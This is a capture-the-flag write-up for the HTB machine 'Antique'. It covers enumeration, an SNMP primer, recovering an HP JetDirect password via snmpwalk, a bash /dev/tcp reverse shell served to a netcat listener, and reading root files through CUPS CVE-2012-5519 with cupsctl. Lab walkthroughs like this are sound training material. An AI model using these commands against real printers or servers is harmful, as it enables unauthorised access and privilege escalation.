# Antique - Linux, easy
## IP: 10.10.11.107

### Enumeration
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
```

If we connect to the host using telnet, it will print **HP JetDirect** and then asks for user input, probably a password.
Since we do not know thme, we can try a UDP scan to check if there is something else.

```
PORT     STATE         SERVICE      VERSION
53/udp   closed        domain
67/udp   closed        dhcps
123/udp  open|filtered ntp
135/udp  closed        msrpc
137/udp  closed        netbios-ns
138/udp  closed        netbios-dgm
161/udp  open          snmp         SNMPv1 server (public)
445/udp  closed        microsoft-ds
631/udp  closed        ipp
1434/udp closed        ms-sql-m
```

Port 161/udp seems the only one open!

### SNMP (Simple Network Managemen Protocol)
SNMP is a way for different devices on a network to share information with one another. It allows devices to communicate even if the devices are different hardware and run different software.

SNMP has a simple architecture based on a client-server model:
1. The servers, called **managers**, collect and process information about devices on the network;
2. The clients, called **agents**, are any type of device or device component connected to the network. They can include not just computers, but also network switches, phones, printers, and so on.

While the SNMP architecture is simple, the data hierarchy the protocol uses can seem complicated if you’re not familiar with it. Fortunately, it’s relatively simple once you understand the philosophy behind it.
To provide flexibility and extensibility, SNMP doesn’t require network devices to exchange data in a rigid format of fixed size. Instead, it uses a tree-like format, under which data is always available for managers to collect.
The data tree consists of multiple tables (or branches), which are called **Management Information Bases**, or **MIBs**. MIBs group together particular types of devices or device components. Each MIB has a unique identifying number, as well as an identifying string. Numbers and strings can be used interchangeably (just like IP addresses and hostnames).
Each MIB consists of one or more nodes, which represent individual devices or device components on the network. In turn, each node has a unique Object Identifier, or OID. The OID for a given node is determined by the identifier of the MIB on which it exists combined with the node’s identifier within its MIB.
This means OIDs take the form of a set of numbers or strings (again, you can use these interchangeably). An example is **1.3.6.1.4.868.2.4.1.2.1.1.1.3.3562.3**.
Written with strings, that OID would translate to:
**iso.org.dod.internet.private.transition.products.chassis.card.slotCps.cpsSlotSummary.cpsModuleTable.cpsModuleEntry.cpsModuleModel.3562.3.**
Using the OID, a manager can query an agent to find information about a device on the network. For example, if the manager wants to know whether an interface is up, it would first query the interface MIB (called the IF-MIB), then check the OID value that reflects operational status to determine whether the interface is up.

### Obtaining User

Exploit taken from [Getting a JetDirect password remotely using the SNMP vulnerability](http://www.irongeek.com/i.php?page=security/networkprinterhacking).

It seems that the device password for many JetDirects is stored in almost plain text and is accessible via SNMP using the read community name. Most folks leave their SNMP community name as "public" but even it has been change it's likely sniffable. Also try "internal" as the community name as this is the default write community name on many JetDirects. Reports are that on some JetDirects, even if you change the community name, "internal" will still work.

We can recover the password with the following command:
```
snmpwalk -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

The output is the following set of "bits":
```
BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```

that we can convert from hexadecimal to chars using python3: `[chr(int(b, 16)) for b in bits.split()]`.
Password: **P@ssw0rd@123!!123**.

Now, after successfully log in using telnet, we can try to spawn a reverse shell.
Setup a python server by creating a `www` directory, and executing the following command `echo "bash -i >& /dev/tcp/<my_IP>/<port> 0>&1"`.
Then start the server with `python3 -m http.server 80` and a netcat listener on the specified port.
Now we should have granted user access on the target.

### From User to Root
We are user *lp*, and checking the groups we are in group **lpadmin**.

lpadmin means CUPS printers (Commond Unix Printix System), which allows the system on which it is configured to accept prints from other clients and perform other actions.

If we execute `curl http://localhost:631` and we save the file, opening it on a browser allows us to (better) see the version of CUPS, which in this case is 1.6.1.

This version is vulnerable to **CVE-2012-5519**, which allows members of the lpadmin group to make changes to the cupsd.conf configuration, which can specify an Error Log path.
When the user visits the Error Log page in the web interface, the cupsd daemon (**running with setuid root**) reads the Error Log path and echoes it as plaintext.

Execute these two commands to obtain the root flag.
```
cupsctl ErrorLog=/root/root.txt
curl http://localhost:631/admin/log/error_log
```

Notice that we can also perform different actions, like obtaining a reverse shell as user root, but for the sake of this machine we just need the flag.
